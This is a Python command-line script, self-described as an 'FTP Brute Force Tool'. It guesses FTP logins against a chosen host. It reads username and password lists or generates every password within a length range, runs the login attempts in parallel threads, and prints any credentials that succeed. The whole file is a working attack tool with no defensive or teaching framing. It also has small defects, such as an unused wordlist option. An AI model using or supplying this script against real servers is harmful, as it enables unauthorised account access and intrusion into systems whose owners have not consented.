import ftplib
from threading import Thread
import queue
from time import sleep
from colorama import init, Fore
import argparse
import itertools
import string

init(autoreset=True)

q = queue.Queue()

def connect_ftp(host, port, q):
    while True:
        user, password = q.get()
        try:
            with ftplib.FTP() as server:
                print(f"{Fore.YELLOW}[?] Trying: {user}:{password}")
                server.connect(host, port, timeout=5)
                server.login(user, password)
                print(f"{Fore.GREEN}[+] Found credentials: ")
                print(f"  ✦ Host: {host}")
                print(f"  ✦ User: {user}")
                print(f"  ✦ Password: {password}{Fore.RESET}")
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}")
        finally:
            q.task_done()

def load_lines(file_path):
    with open(file_path, "r") as file:
        lines = [line.strip() for line in file.readlines()]
    return lines

def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def main():
    parser = argparse.ArgumentParser(description="FTP Brute Force Tool")
    parser.add_argument("--host", type=str, required=True, help="FTP server host or IP")
    parser.add_argument("--port", type=int, default=21, help="FTP server port")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads to use")
    parser.add_argument("--user", type=str, help="Single username")
    parser.add_argument("--passlist", type=str, help="Path to password list")
    parser.add_argument("--userlist", type=str, help="Path to user list")
    parser.add_argument("--wordlist", type=str, help="Combined user:pass wordlist")
    parser.add_argument("--min-length", type=int, help="Minimum password length")
    parser.add_argument("--max-length", type=int, help="Maximum password length")
    parser.add_argument("--chars", type=str, default=string.ascii_letters + string.digits, help="Characters for password generation")
    args = parser.parse_args()

    host = args.host
    port = args.port
    threads = args.threads

    users = []
    passwords = []

    if not args.user and not args.userlist:
        print("[-] Please provide a single username or a userlist file.")
        return

    if args.userlist:
        users = load_lines(args.userlist)
    else:
        users = [args.user]

    if args.passlist:
        passwords = load_lines(args.passlist)
    elif args.min_length and args.max_length:
        print(f"[+] Generating passwords...")
        passwords = generate_passwords(args.min_length, args.max_length, args.chars)
    else:
        print("[-] Please provide a passlist file or specify password generation options.")
        return

    for user in users:
        for password in passwords:
            q.put((user, password))

    for _ in range(threads):
        thread = Thread(target=connect_ftp, args=(host, port, q))
        thread.daemon = True
        thread.start()

    q.join()

if __name__ == "__main__":
    main()
